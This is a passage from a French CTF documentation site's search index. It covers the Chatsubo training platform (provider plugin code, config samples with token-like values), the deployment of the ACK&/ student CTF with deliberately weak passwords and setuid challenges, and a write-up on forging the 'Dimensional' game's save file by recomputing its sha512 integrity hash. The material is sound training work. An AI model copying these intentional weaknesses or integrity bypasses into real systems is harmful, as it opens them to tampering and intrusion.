cr\u00e9ons un petit script bash qui reprend les commandes au-dessus : save = \"alvoras:1;used,2;,3;,4;,5;,6;,7;,8;,9;,10;,11;,12;,13;,14;,15;,16;,17;,18;,19;,20;,21;,22;,23;,24;,25;,26;,27;,28;,29;,30;:Salle de saut:Porte:\" hash = $( echo -n \" $save \" | sha512sum | head -c 12 ) echo $save$hash echo -n $save$hash > tmp_save zlib-flate -compress < ./tmp_save > .save.ans ./dimensional ... et nous obtenons une sauvegarde corrompue. Nous v\u00e9rifions que le script fonctionne bien en ajoutant un unique objet : save = \"alvoras:1;used,2;,3;:Salle de saut:Porte:\" hash = $( echo -n \" $save \" | sha512sum | head -c 12 ) echo $save$hash echo -n $save$hash > tmp_save zlib-flate -compress < ./tmp_save > .save.ans ./dimensional Il fonctionne donc correctement ; le crash peut \u00eatre li\u00e9 soit \u00e0 une trop grande quantit\u00e9 d'objets dans l'inventaire, soit \u00e0 des identifiants invalides. Nous avan\u00e7ons plus prudemment en it\u00e9rant sur le 3\u00e8me champ, jusqu'\u00e0 arriver sur la sauvegarde suivante : alvoras:1;used,2;,4;:Salle de saut:Porte:7dc79aa29c6f Nous obtenons ainsi l'UVL540, qui poss\u00e8de l'identifiant \"4\". La console # Une fois l'UVL540 obtenu, il faut aller charger le programme de saut depuis la console. Un mot de passe est n\u00e9cessaire, sans quoi la sauvegarde est d\u00e9truite. Encore une fois, nous utilisons strings pour fouiller dans le programme. Nous cherchons une cha\u00eene de caract\u00e8re que nous savons pr\u00e9sente (ici \"Si un jour tu lis ce message,\") pour nous rendre dans la section o\u00f9 sont contenues les variables du programme : Quelques lignes de dialogue que nous n'avons jamais vu attire notre attention : > Tu cherches des indices autour de toi. > Le vieux avait une mauvaise m moire, le mot de passe devrait tre not quelque part... > Bingo ! Sous le *clavier*. Si l'ANSSI voyait a... Dans la salle de saut, nous nous rendons devant le *clavier*... ... pour y trouver le mot de passe. Info Pour \u00e9viter que le mot de passe ne se retrouve en clair dans le binaire et forcer le joueur \u00e0 passer par le jeu, il est d\u00e9riv\u00e9 de mani\u00e8re dynamique \u00e0 partir du hash d'int\u00e9grit\u00e9 de la sauvegarde charg\u00e9e. Nous le rentrons dans la console : L'UVL540 est maintenant charg\u00e9. Le flag # Nous pouvons d\u00e9sormais utiliser l'item pour se rendre dans le cyberespace et r\u00e9cup\u00e9rer le flag :","title":"CTF"},{"location":"ctf/#ctf","text":"","title":"CTF"},{"location":"ctf/#chatsubo","text":"Info Source : Publication du code pr\u00e9vue d\u00e9but juillet Inspiration : CTFd , Hackbox , HackTheBox , TryHackMe Technologies : Python, VueJS, Docker, Wireguard La plateforme Chatsubo a \u00e9t\u00e9 cr\u00e9\u00e9e dans l'optique de donner la possibilit\u00e9 aux communaut\u00e9s de toutes tailles de proposer \u00e0 leurs membres une plateforme d'entra\u00eenement capable d'h\u00e9berger des instances vuln\u00e9rables.","title":"Chatsubo"},{"location":"ctf/#apercu","text":"Your browser does not support the video tag. Ajout d'une machine et connexion \u00e0 l'instance Affichage des challenges de la track \"Confirm\u00e9\" Listing des joueurs Profil des challenges Interface d'\u00e9dition des challenges Affichage des tentatives de validation en temps r\u00e9el Interface d'administration des challenges Note Les captures de d\u00e9mo ont \u00e9t\u00e9 r\u00e9alis\u00e9s avec le th\u00e8me du CTF ACK&/.","title":"Aper\u00e7u"},{"location":"ctf/#les-instances","text":"Chaque challenge se compose de deux parties : Le template, qui correspond \u00e0 l'image \u00e0 partir de laquelle l'instance sera d\u00e9ploy\u00e9e L'instance d\u00e9ploy\u00e9e, qui expose les informations li\u00e9es \u00e0 son \u00e9tat ainsi que celles n\u00e9cessaires pour communiquer avec (adresse IP, realm) Lorsque le syst\u00e8me de flag dynamique est utilis\u00e9, l'instance mettra \u00e9galement \u00e0 disposition les m\u00e9tadonn\u00e9es n\u00e9cessaires pour leur validation depuis la plateforme. Pour l'instant, seul Docker supporte ce syst\u00e8me gr\u00e2ce aux labels, qu'il est possible de r\u00e9cup\u00e9rer via l'API et qui sont \u00e9galement accessible au sein du conteneur via les variables d'environnement lors de l'instanciation. Exemple de Dockerfile se basant sur ce syst\u00e8me : FROM alpine:3.12 RUN apk add python3 ARG FLAG0 ARG SESSION LABEL chatsubo.template = \"hello-flag\" \\ chatsubo.flags.helloworld.value = \" $FLAG0 \" \\ chatsubo.flags.helloworld.points = \"25\" \\ chatsubo.session = \" $SESSION \" RUN mkdir /secrets RUN echo \" $FLAG0 \" > /secrets/flag WORKDIR /secrets CMD /bin/sh Avec la ligne de commande permettant de d\u00e9ployer une instance \u00e0 partir de ce template : docker build . --build-arg FLAG0 = level0 --build-arg SESSION = $( cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 ) Toutes les informations expos\u00e9s par les labels sont accessible depuis Chatsubo et peuvent \u00eatre utilis\u00e9es pour valider les flags, aiguiller les utilisateurs vers leurs instances, etc.","title":"Les instances"},{"location":"ctf/#les-providers","text":"Le principe fondamental du fonctionnement du backend est le suivant : le serveur re\u00e7oit des ordres qu'il transmet aux plugins, qui savent comment l'ex\u00e9cuter. Cette architecture vise \u00e0 favoriser au maximum l'adaptation de Chatsubo aux diff\u00e9rents environnements de virtualisation des communaut\u00e9s amen\u00e9es \u00e0 l'utiliser, Ainsi, les plugins tiennent d'une part le r\u00f4le de traducteur entre les donn\u00e9es expos\u00e9es par l'hyperviseur et celles attendues par la plateforme pour fonctionner, et d'autre part celui d'interm\u00e9diaire entre les ordres re\u00e7ues depuis l'interface et la mani\u00e8re de les \u00e9x\u00e9cut\u00e9s. Il existe aujourd'hui un plugin pour Docker et pour PVE. Si l'on prend PVE comme exemple, il suffit de cr\u00e9er deux fichiers pour le rendre compatible avec Chatsubo : Un fichier provider.py qui remplit les besoins suivants : Lister les templates disponibles Lister les instances en cours d'ex\u00e9cution Rollback une instance au snapshot d\u00e9fini comme l'\u00e9tat initial de la machine Cr\u00e9er une instance du provider \u00e0 partir des donn\u00e9es disponibles dans le fichier de configuration Et un fichier instance.py qui traduit les informations re\u00e7ues de l'hyperviseur et qui contient les donn\u00e9es suivantes : Son nom Le realm dont elle fait partie Le template duquel elle est issue Son adresse IP Afficher le code du fichier \"provider.py\" du plugin PVE import re import traceback import requests from proxmoxer import ProxmoxAPI from urllib3.exceptions import MaxRetryError from app.providers.base.provider import BaseProvider from app.providers.base.template import BaseTemplate from app.providers.exc import VpnProviderNotFoundException , \\ VpnProviderErrorException , BackendConnectionException , MetadataNotFoundException , MalformedMetadataException from app.providers.pve.instance import PVEInstance class PVEProvider ( BaseProvider ): kind = \"pve\" def __init__ ( self , name , host , user , token_name , token_value , vpns , nodes = None , verify_ssl = False , sep = \"--\" ): if nodes is None : nodes = [ \"pve\" ] self . name = name self . nodes = nodes self . sep = sep self . client = ProxmoxAPI ( host , user = user , token_name = token_name , token_value = token_value , verify_ssl = verify_ssl ) remote_nodes = [ node_data [ \"node\" ] for node_data in self . client . nodes . get ()] for node in self . nodes : if node not in remote_nodes : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , f \"Node ' { node } ' not found\" ) super () . __init__ ( kind = self . kind , vpn_confs = vpns ) def test_client ( self ): nodes = self . client . nodes . get () for node in nodes : self . client . nodes ( node [ \"node\" ]) . status . get () def list_templates ( self ): templates = [] vms = self . list_all () try : filtered = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == 1 , vms )) rg = re . compile ( \"CHATSUBO_TEMPLATE=(.*)\" ) for config in filtered : match = rg . search ( config [ \"description\" ]) if not match : continue name = match [ 1 ] templates . append ( BaseTemplate ( name , self . to_json ()) . to_json ()) except Exception : raise return templates def list_all ( self ): vms = [] for node in self . nodes : try : instances = self . client . nodes ( node ) . qemu . get () except ( MaxRetryError , requests . exceptions . ConnectionError , ConnectionRefusedError ) as e : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , str ( e )) for inst in instances : inst [ \"description\" ] = self . client . nodes ( node ) . qemu ( inst [ \"vmid\" ]) . config . get () . get ( \"description\" , \"\" ) inst [ \"node\" ] = node vms += instances return vms def list_instances ( self , realm = None ): instances = [] vms = self . list_all () raw = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == \"\" , vms )) for vm in raw : try : instances . append ( PVEInstance ( vm [ \"vmid\" ], vm [ \"name\" ], self . prefix , vm [ \"description\" ], vm [ \"node\" ], self . sep )) except ( MetadataNotFoundException , MalformedMetadataException ): pass if realm : instances = list ( filter ( lambda i : i . realm == realm , instances )) return instances def reset ( self , realm , box , session = None ): target = None instances = self . list_instances ( realm = realm ) for inst in instances : if inst . template == box . template : target = inst snapshots = self . client . nodes ( target . node ) . qemu . get ( f \" { target . id } /snapshot\" ) last_snap_name = list ( filter ( lambda x : x . get ( \"running\" ) == 1 , snapshots ))[ 0 ] . get ( \"parent\" ) if not last_snap_name : return False self . client . nodes ( target . node ) . qemu . post ( f \" { target . id } /snapshot/ { last_snap_name } /rollback\" ) return True @classmethod def from_config ( cls , name , raw_conf ): parsed = { \"name\" : name , \"host\" : f \" { raw_conf [ 'api' ][ 'host' ] } : { raw_conf [ 'api' ][ 'port' ] } \" , \"user\" : raw_conf [ \"api\" ][ \"user\" ], \"token_name\" : raw_conf [ \"api\" ][ \"token\" ][ \"name\" ], \"token_value\" : raw_conf [ \"api\" ][ \"token\" ][ \"value\" ], \"vpns\" : raw_conf [ \"vpns\" ] } if nodes := raw_conf . get ( \"nodes\" ): parsed [ \"nodes\" ] = nodes if verif := raw_conf . get ( \"verify_ssl\" ): parsed [ \"verify_ssl\" ] = verif if sep := raw_conf . get ( \"sep\" ): parsed [ \"sep\" ] = sep return cls ( ** parsed ) Afficher le code du fichier \"instance.py\" du plugin PVE import re from app.providers.exc import MetadataNotFoundException , MalformedMetadataException from app.providers.base.instance import BaseInstance class PVEInstance ( BaseInstance ): def __init__ ( self , id , name , prefix , description , node = \"pve\" , sep = \"--\" ): self . prefix = prefix self . sep = sep self . node = node try : template , realm , address = self . parse_meta ( description ) except ( MetadataNotFoundException , MalformedMetadataException ): raise super ( PVEInstance , self ) . __init__ ( id , name , realm , template , address , sep ) def parse_meta ( self , raw ): \"\"\" Parse and extract the template, realm and IP address from the metadata field of the instance :param raw: string holding the metadata info :return: returns the template name, the realm holding this instance and its IP address \"\"\" template , realm , address = \"\" , \"\" , \"\" raw = raw . lower () if not any ( f \"chatsubo_ { key } \" in raw for key in [ \"template\" , \"realm\" , \"address\" ]): raise MalformedMetadataException rg = re . compile ( \"(chatsubo_\\w*)=(.*)\" , re . MULTILINE ) matches = rg . findall ( raw ) for match in matches : if match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"template\" : template = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"realm\" : realm = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"address\" : address = match [ 1 ] return template , realm , address def to_json ( self ): data = self . _to_json () data . update ({ \"node\" : self . node , }) return data Une fois le plugin cr\u00e9\u00e9, il suffit de renseigner les informations n\u00e9cessaires dans le fichier de configuration, comme l'exemple ci-dessous : providers : pve : warzone : # provider name api : user : \"api@pam\" host : \"https://pve.hacklab\" port : 8006 token : name : \"b5215aeb-ae28-432c-b1b7-047276d87cf\" value : \"dff1ae17-4eb3-4543-a9f2-a703f375c48\" vpns : - realm : \"wz01\" url : \"http://gate.hacklab:7474\" header : \"X-Chatsubo-Token\" token : \"W4etxFM57y1MfRCDqzkjKfZVMEbunhoOLNE9Hj9xg7YLoZ0FXZYW8SahlGPJy6SdlRDXfDHe75x9yEZWz9TasKqG5KNPjKsSumI7KVCw28FgLnMnnbsy7jvcGvUdhGVv\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" docker : # Empty docker provider config","title":"Les providers"},{"location":"ctf/#acces-vpn","text":"Afin de faciliter la gestion du r\u00e9seau et de l'acc\u00e8s des joueurs aux instances, il est n\u00e9cessaire de passer par un VPN pour acc\u00e9der aux machines. Les joueurs peuvent r\u00e9cup\u00e9rer leurs acc\u00e8s \u00e0 tout moment via l'interface web. Pour interfacer les ponts VPN avec la plateforme, nous avons besoin d'un client d\u00e9di\u00e9 install\u00e9 sur chacune de ces machines. Ce client s'appelle chatsubo-gate et communique avec Chatsubo via une API. Son r\u00f4le va \u00eatre d'envoyer le contenu des configurations pr\u00e9-g\u00e9n\u00e9r\u00e9es \u00e0 l'installation et de tenir une table \u00e9tablissant un lien entre un pseudo et une configuration VPN. J'utilise l'image Docker linuxserver.io pour g\u00e9n\u00e9rer les configurations et faire tourner le serveur, mais puisque chatsubo-gate n'a besoin que du dossier qui contient les configurations, n'importe quelle m\u00e9thode peut \u00eatre utilis\u00e9e. Une configuration minimale est n\u00e9cessaire pour que la plateforme et le pont VPN puisse communiquer : C\u00f4t\u00e9 chatsubo-gate , il est n\u00e9cessaire de renseigner le dossier contenant les fichiers de configurations, le realm ainsi que le token d'authentification utilis\u00e9 pour s\u00e9curiser les \u00e9changes avec la plateforme. realm : \"ans01\" # This token must be the same on the chatsubo plateform. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" wg_clients_dir : \"/opt/chatsubo-gate/clients\" La notion de realm est importante puisqu'elle va nous permettre d'une part d'exposer plusieurs instances distinctes d'un m\u00eame template en parall\u00e8le, et d'autre part de connecter plusieurs ponts VPN h\u00e9berg\u00e9s sur plusieurs machines diff\u00e9rentes au m\u00eame sous r\u00e9seau. C\u00f4t\u00e9 Chatsubo, il est n\u00e9cessaire d'indiquer l'url du pont, le m\u00eame token et le realm correspondant dans la configuration de chaque provider. Par exemple : vpns : - realm : \"ans01\" url : \"http://challs.hacklab:7474\" header : \"X-Chatsubo-Token\" # This token must be the same on the linked chatsubo-gate. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" L'en-t\u00eate utilis\u00e9 pour l'authentification ainsi que les endpoints sont modifiables via la configuration de Chatsubo afin de faciliter le d\u00e9veloppement d'un connecteur alternatif dans le but, par exemple, de suporter un r\u00e9seau bas\u00e9 sur OpenVPN.","title":"Acc\u00e8s VPN"},{"location":"ctf/#ack","text":"Le CTF ACK&/ \u00e9tait un \u00e9v\u00e8nement destin\u00e9 exclusivement aux \u00e9l\u00e8ves de l'ESGI qui s'est d\u00e9roul\u00e9 du 19 au 21 f\u00e9vrier 2021. Les challenges \u00e9taient con\u00e7us pour se suivre et se r\u00e9partissaient sur plusieurs instances, comportant chacune 4 niveaux cons\u00e9cutifs. Exemple Pour passer du level0 au level1, il fallait r\u00e9ussir le challenge de l'utilisateur level0 puis se connecter au suivant gr\u00e2ce au flag obtenu. Deux tracks \u00e9taient disponibles : La track \"d\u00e9butants\" 12 challenges r\u00e9partis en 3 instances La track \"confirm\u00e9s\" 20 challenges r\u00e9partis en 5 instances","title":"ACK&amp;/"},{"location":"ctf/#deploiement-des-instances","text":"L'ensemble des challenges pr\u00e9sents sur l'instance \u00e9taient install\u00e9s et configur\u00e9s lors du d\u00e9ploiement. Exemple de Dockerfile utilis\u00e9 pour d\u00e9ployer une instance FROM ubuntu:20.04 # Setup RUN apt update RUN apt install -y openssh-server vim man less netcat cron zip sl COPY src/root/etc /etc # Allow caching of apt by putting it below # level0 password ARG RNG0 = toor # Challenger's unique session, handled by Chatsubo ARG SESSION # Register all the generated flag passed by Chatsubo via --build-args # ENV is needed to allow entrypoint to access them ARG FLAG0 ARG FLAG1 ARG FLAG2 ARG FLAG3 ENV FLAGS = \" $FLAG0 ; $FLAG1 ; $FLAG2 ; $FLAG3 \" RUN echo $FLAGS RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $RNG0 \" ) level0 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG0 \" ) level1 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG1 \" ) level2 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG2 \" ) level3 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG3 \" ) level4 # Exposed metadata, needed by Chatsubo for dynamic flags, session handling and ssh initial access LABEL chatsubo.template = \"adv_ans01\" \\ chatsubo.creds.ssh.username = \"level0\" \\ chatsubo.creds.ssh.password = \" $RNG0 \" \\ chatsubo.flags.step0.value = \" $FLAG0 \" \\ chatsubo.flags.step0.points = \"250\" \\ chatsubo.flags.step1.value = \" $FLAG1 \" \\ chatsubo.flags.step1.points = \"250\" \\ chatsubo.flags.step2.value = \" $FLAG2 \" \\ chatsubo.flags.step2.points = \"250\" \\ chatsubo.flags.step3.value = \" $FLAG3 \" \\ chatsubo.flags.step3.points = \"250\" \\ chatsubo.session = \" $SESSION \" # Add challenges setup scripts and resources COPY src/root / RUN chmod u+x /home/level**/ans_init.sh # Needed for sshd RUN mkdir /run/sshd RUN echo \" $FLAGS \" > /root/flags COPY src/entrypoint.sh /entrypoint.sh RUN chmod u+x /entrypoint.sh ENTRYPOINT /bin/bash -c '/etc/init.d/cron start && cat /root/flags | /entrypoint.sh' Chaque dossier comprenait un Dockerfile comme celui ci-dessus ainsi que l'ensemble des fichiers \u00e0 copier dans le conteneur. Par exemple : . |-- Dockerfile |-- Makefile `-- src |-- entrypoint.sh `-- root |-- etc | `-- ssh | `-- sshd_config `-- home |-- level0 | |-- ans_init.sh | `-- main.c |-- level1 | |-- ans_init.sh | `-- hexhexhex |-- level2 | |-- ans_init.sh | |-- challenge.py | `-- create_flag.py |-- level3 | |-- ans_init.sh | |-- main.c | `-- patch.py `-- level4 |-- ans_init.sh `-- finish.txt L'entrypoint avait pour seul r\u00f4le d'appeler le script ans_init.sh pr\u00e9sent dans le home de chacun des utilisateurs, en lui transmettant le flag \u00e0 ins\u00e9rer dans le challenge, le nom de l'utilisateur courant ainsi que celui du suivant : #!/bin/bash rm -f $0 SCRIPT_NAME = \"ans_init.sh\" RAW_FLAGS = \" $( cat /root/flags ) \" FLAGS =( ${ RAW_FLAGS //;/ } ) # Start challenge setup script for each levels and remove it for i in { 0 ..4 } ; do current_user = \"level $i \" next_user = \"level $(( $i + 1 )) \" init_script = \"/home/level $i / $SCRIPT_NAME \" current_flag = ${ FLAGS [i] :- \"_\" } [ -f \" $init_script \" ] && bash -c \" $init_script $current_flag $current_user $next_user \" rm -f $init_script done rm -f /root/flags /etc/init.d/cron start # Allow remote access while true ; do /usr/sbin/sshd -e -D done Ce script, ans_init.sh , \u00e9tait \u00e9crit par le cr\u00e9ateur du challenge et s'occupait de mettre en place les diff\u00e9rents \u00e9l\u00e9ments n\u00e9cessaires \u00e0 son fonctionnement : FLAG = $1 CURRENT_USER = $2 NEXT_USER = $3 bin_name = \"hexhexhex\" chown -R \" $CURRENT_USER :\" \"/home/ $CURRENT_USER \" chown \" $NEXT_USER :\" \"/home/ $CURRENT_USER / $bin_name \" chmod u+xs \"/home/ $CURRENT_USER / $bin_name \" echo $FLAG > \"/home/ $NEXT_USER /flag\" chown \" $NEXT_USER :\" \"/home/ $NEXT_USER /flag\" chmod 400 \"/home/ $NEXT_USER /flag\"","title":"D\u00e9ploiement des instances"},{"location":"ctf/#challenges","text":"","title":"Challenges"},{"location":"ctf/#dimensional","text":"Ce challenge a \u00e9t\u00e9 diffus\u00e9 lors du CTF ACK&/ organis\u00e9 par le Hacklab ESGI. Il s'agit d'une text adventure auquelle il faut tricher pour obtenir un objet pr\u00e9cis ainsi qu'un mot de passe, qui permettent au joueur de se rendre dans le cyberespace et d'y de r\u00e9cup\u00e9rer le flag.","title":"Dimensional"},{"location":"ctf/#tlpl","text":"1) Lire la note sur le bureau pour comprendre l'objectif : aller dans le cyberespace gr\u00e2ce \u00e0 l'item UVL540, charg\u00e9 depuis la console 2) Trouver la console qui n\u00e9cessite un mot de passe 3) Faire le tour du jeu pour comprendre qu'il faut obtenir l'UVL540 en trichant 4) D\u00e9compresser le fichier de sauvegarde pour le rendre lisible 5) Analyser le format de la sauvegarde pour identifier sa structure 6) Identifier comment g\u00e9n\u00e9rer le check d'int\u00e9grit\u00e9 ( sha512(save)[12:] ) en analysant les paquets import\u00e9s par le binaire via strings 7) It\u00e9rer sur les identifiants des items, s\u00e9quentiels, jusqu'\u00e0 obtenir l'UVL540 (ID 4) 8) Trouver le dialogue cach\u00e9 gr\u00e2ce \u00e0 strings pour identifier le *clavier* et r\u00e9cup\u00e9rer ainsi le mot de passe de la console cach\u00e9 dessous 9) Charger l'UVL540 pour aller dans le cyberespace et obtenir le flag","title":"TL;PL"},{"location":"ctf/#premiers-pas","text":"Nous lan\u00e7ons le binaire une premi\u00e8re fois : Il s'agit d'une text adventure, qui fonctionne de la mani\u00e8re suivante : Les *ast\u00e9risques* indiquent les endroits o\u00f9 nous pouvons nous d\u00e9placer Les [crochets] indiquent les objets avec lesquels nous pouvons interagir Nous pouvons faire une sauvegarde gr\u00e2ce \u00e0 la commande save Nous allons au bureau et nous lisons la note : Un mot est \u00e9crit sur la note : Salut alvoras, J't'avais bien dit que j'allais r\u00e9ussir. Un moyen de transcender la mati\u00e8re, de communiquer \u00e0 la vitesse de la lumi\u00e8re. Bordel si \u00e7a donne pas envie \u00e7a ! Si un jour tu lis ce message, d\u00e9merde-toi pour r\u00e9cup\u00e8rer un [UVL540] et charge le programme de saut depuis la [console], dans la pi\u00e8ce d'\u00e0 c\u00f4t\u00e9. Puis rejoins-moi dans le *cyberespace*. - Moc Plusieurs informations importantes ici : Nous devons obtenir un UVL540, qui est un objet utilisable Nous devons trouver la console pour charger le programme de saut Puis nous devons nous rendre dans la salle \"cyberespace\" Nous pouvons tenter de nous rendre directement dans le cyberespace : ... qui nous accueille en nous grillant la cervelle puisque nous ne poss\u00e9dons pas d'UVL540. En relan\u00e7ant le jeu, nous remarquons que la sauvegarde a \u00e9t\u00e9 supprim\u00e9e. Nous continuons \u00e0 d\u00e9couvrir le jeu en allant vers la porte, indiqu\u00e9e au d\u00e9but du jeu. Nous d\u00e9couvrons la prochaine salle, la \"Salle de saut\", et nous d\u00e9verrouillons la porte gr\u00e2ce \u00e0 la clef situ\u00e9e au dessus de la porte. Nous pouvons consulter notre inventaire avec la commande inv : Une fois dans la salle de saut, nous trouvons la console , dont nous avons besoin pour charger l'UVL540 avant de pouvoir nous rendre dans le cyberespace. Nous tentons d'utiliser la console : Il nous faut donc un mot de passe... et notre sauvegarde est une nouvelle fois supprim\u00e9e si nous nous trompons. Nous continuons \u00e0 fouiller, mais nous avons bel et bien fait le tour du jeu.","title":"Premiers pas"},{"location":"ctf/#analyse","text":"R\u00e9capitulons : + Le but du jeu est de nous rendre dans le cyberespace + Pour cela, nous avons besoin de l'item \"UVL540\" + Il faut que cet item soit \"charg\u00e9\" via la console + La console demande un mot de passe Nous avons donc besoin : 1) D'obtenir un objet qui ne peut pas \u00eatre obtenu dans le jeu 2) Du mot de passe de la console Il va falloir tricher !","title":"Analyse"},{"location":"ctf/#uvl540","text":"","title":"UVL540"},{"location":"ctf/#le-format-de-sauvegarde","text":"Commen\u00e7ons par analyser une sauvegarde toute fra\u00eeche : Il s'agit donc d'un fichier compr\u00e9ss\u00e9 gzip contenant une cha\u00eene de caract\u00e8re. Nous obtenons le format suivant : nom::position::12 caract\u00e8res hexa Nous avons le nom du joueur, la pi\u00e8ce dans laquelle nous nous trouvons et 12 caract\u00e8res en hexad\u00e9cimal, \u00e0 priori sans lien avec le jeu. Le s\u00e9parateur semble \u00eatre \"::\". Nous rechargeons la sauvegarde et avan\u00e7ons dans le jeu pour voir comment sa structure \u00e9volue : Nous remarquons que le jeu affiche l'\u00e9tat de la sauvegarde lorsque nous la chargeons et que la valeur correspond au dernier champ du fichier de sauvegarde. Ici, nous nous sommes d\u00e9plac\u00e9s et avons ajout\u00e9 deux objets \u00e0 notre inventaire : la bo\u00eete et la clef, dont nous avons fait passer l'\u00e9tat \u00e0 \"used\". La sauvegarde ressemble maintenant \u00e0 : Info Note : Un retour \u00e0 la ligne a \u00e9t\u00e9 ajout\u00e9 \u00e0 la fin de la commande ( && echo ) pour que la sauvegarde soit lisible. Le fichier de sauvegarde est consid\u00e9r\u00e9 comme corrompu par le jeu s'il se termine par un saut de ligne. Nous retrouvons 2 blocs au format <int>;<string> au premier :: et le nom d'une salle au second :: . Nous comprenons qu'il s'agit de l'inventaire avec une suite d'objets sous la forme <id>;<\u00e9tat>, puisque l'on retrouve l'\u00e9tat \"used\" de notre clef. On note au passage que la case d'\u00e9tat peut \u00eatre vide ( 2;<null> ). Les 12 caract\u00e8res ont chang\u00e9s avec la sauvegarde, il s'agit donc certainement d'un hash (type MD5) ou d'un code de correction d'erreur (type CRC32). Le format de la sauvegarde est donc le suivant : <nom>:<objet1>;<\u00e9tat>,<objet2>;<\u00e9tat>,...,<objetN>;<\u00e9tat>:<position>:<position pr\u00e9c\u00e9dente>:<checksum> Les identifiants des objets semblent \u00eatre incr\u00e9mentaux : nous testons de changer notre clef en bo\u00eete (deux objets dont l'ID est connu) en changeant l'ID de l'item 1 en 2 . Pour cela nous d\u00e9compressons notre fichier de sauvegarde avec zlib-flate -uncompress < ./.save.ans > save.uncomp , que nous recompressons avec zlib-flate -compress < ./save.uncomp > .save.ans . Danger Important : il est n\u00e9cessaire d'utiliser set noendofline binary \u00e0 chaque ouverture de vim ou d'inscrire ce param\u00e8tre dans un fichier .vimrc \u00e0 la racine du dossier pour \u00e9viter que vim ne rajoute de saut de ligne \u00e0 la fin du fichier et ne corrompe la sauvegarde. Une alternative serait de recr\u00e9er un fichier interm\u00e9diaire en retirant le retour \u00e0 la ligne avec head -c -1 ./save.uncomp > ./save.uncomp2 . Nous forgeons la nouvelle sauvegarde et tentons de la charger : Le jeu nous indique que notre sauvegarde est corrompue.","title":"Le format de sauvegarde"},{"location":"ctf/#le-check-dintegrite","text":"Nous voulons v\u00e9rifier si l'hypoth\u00e8se du check d'int\u00e9grit\u00e9 est juste. Pour cela, nous allons chercher dans le binaire si des fonctions de hachage sont utilis\u00e9es. Il n'est pas n\u00e9cessaire de sortir un logiciel de reverse comme IDA pour l'instant ; nous commencerons par utiliser les commandes file et strings . Le file nous indique qu'il s'agit d'un binaire 64 bits cod\u00e9 en Go, non stripp\u00e9 : level0@359b243ce4cd:~$ file ./dimensional ./dimensional: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=KRbhNK-qTCrI6YYoim48/mbevmsH8s-itlC7_D9zy/GKbmbssdYECvm3tn7IoT/HS2lESc5tiP-_ekaKQ5m, not stripped Les programmes compil\u00e9s depuis le Golang conservent l'ensemble des fonctions utilis\u00e9s en clair dans le code source. Nous confirmons cela avec un premier strings sans filtre : level0@359b243ce4cd:~$ strings ./dimensional ... gitlab.com/Alvoras/dimensional/internal/game.UserInputln gitlab.com/Alvoras/dimensional/internal/game.PasswordInputln gitlab.com/Alvoras/dimensional/internal/game.init.0.func1 gitlab.com/Alvoras/dimensional/internal/game.init.0.func2 gitlab.com/Alvoras/dimensional/internal/game.init.0.func3 gitlab.com/Alvoras/dimensional/internal/game.init.0.func4 gitlab.com/Alvoras/dimensional/internal/game.init.0.func5 gitlab.com/Alvoras/dimensional/internal/game.init.0.func6 gitlab.com/Alvoras/dimensional/internal/game.init.0.func7 gitlab.com/Alvoras/dimensional/internal/game.init.0.func8 type..eq.gitlab.com/Alvoras/dimensional/internal/game.SaveItem type..eq.[5]interface {} main.main En utilisant grep , nous pouvons isoler les fonctions potentiellement utilis\u00e9es gr\u00e2ce aux noms des paquets correspondants : \"hash\" level0@359b243ce4cd:~$ strings ./dimensional | grep -i hash/ hash/adler32 hash/adler32.(*digest).Reset hash/adler32.(*digest).Size hash/adler32.(*digest).BlockSize hash/adler32.update hash/adler32.(*digest).Write hash/adler32.(*digest).Sum32 hash/adler32.(*digest).Sum hash/adler32.New hash/adler32.Checksum /usr/local/go/src/hash/adler32/adler32.go hash/adler32..inittask go.itab.*hash/adler32.digest,hash.Hash32 hash/adler32.(*digest).Reset hash/adler32.(*digest).Size hash/adler32.(*digest).BlockSize hash/adler32.update hash/adler32.(*digest).Write hash/adler32.(*digest).Sum32 hash/adler32.(*digest).Sum \"crypto\" level0@359b243ce4cd:~$ strings ./dimensional | grep -i crypto/ crypto/sha512 crypto/sha512.init.0 crypto/sha512.(*digest).Reset crypto/sha512.New crypto/sha512.New512_224 crypto/sha512.New512_256 crypto/sha512.New384 crypto/sha512.(*digest).Size crypto/sha512.(*digest).BlockSize crypto/sha512.(*digest).Write crypto/sha512.(*digest).Sum crypto/sha512.(*digest).checkSum crypto/sha512.Sum512 crypto/sha512.block crypto/sha512.init crypto/sha512.blockAMD64 crypto/sha512.blockAVX2 /usr/local/go/src/crypto/sha512/sha512block_amd64.s /usr/local/go/src/crypto/sha512/sha512block_amd64.go /usr/local/go/src/crypto/sha512/sha512.go /usr/local/go/src/crypto/crypto.go crypto/sha512.blockAVX2.args_stackmap crypto/sha512.blockAMD64.args_stackmap crypto/sha512..inittask crypto/sha512._K crypto/sha512.useAVX2 go.itab.*crypto/sha512.digest,hash.Hash crypto/sha512.init.0 crypto/sha512.(*digest).Reset crypto/sha512.New crypto/sha512.New512_224 crypto/sha512.New512_256 crypto/sha512.New384 crypto/sha512.(*digest).Size crypto/sha512.(*digest).BlockSize crypto/sha512.(*digest).Write crypto/sha512.(*digest).Sum crypto/sha512.(*digest).checkSum crypto/sha512.Sum512 crypto/sha512.block crypto/sha512.init crypto/sha512.blockAMD64 crypto/sha512.blockAVX2 